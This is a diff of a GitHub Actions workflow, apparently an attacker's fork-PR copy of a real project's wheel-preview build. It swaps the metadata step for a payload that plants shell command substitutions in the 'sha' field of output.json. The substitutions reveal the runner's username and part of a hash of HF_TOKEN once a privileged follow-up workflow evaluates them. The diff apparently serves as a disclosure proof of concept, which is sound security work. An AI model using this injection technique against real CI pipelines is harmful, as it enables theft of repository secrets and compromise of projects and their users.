@@ -1,4 +1,4 @@
-# Mirror of gradio-app/trackio .github/workflows/pr-wheel-preview-build.yml (benign base version)
+# Attacker's copy, in the fork PR. `name:` must match the consumer's workflow_run trigger.
 name: PR wheel preview build
 
 on:
@@ -21,19 +21,14 @@ jobs:
           mkdir -p dist
           echo "fake wheel" > dist/trackio-0.0.0-py3-none-any.whl
 
+      # The only change: output.json carries a shell payload in `sha`.
+      # Quoted heredoc, so $(...) is stored literally and only evaluates
+      # later, in the privileged consumer's run: block.
       - name: Write metadata
         run: |
-          python3 << 'PY'
-          import json
-          from pathlib import Path
-          wheels = sorted(Path("dist").glob("trackio-*.whl"))
-          meta = {
-              "pr_number": ${{ github.event.pull_request.number }},
-              "sha": "${{ github.event.pull_request.head.sha }}",
-              "wheel_basename": wheels[0].name,
-          }
-          Path("output.json").write_text(json.dumps(meta))
-          PY
+          cat > output.json <<'JSON'
+          {"pr_number": 1, "sha": "PWNED_$(id -un)_TOKENMD5_$(echo -n $HF_TOKEN | md5sum | cut -c1-12)", "wheel_basename": "trackio-0.0.0-py3-none-any.whl"}
+          JSON
           cat output.json
 
       - name: Upload wheel
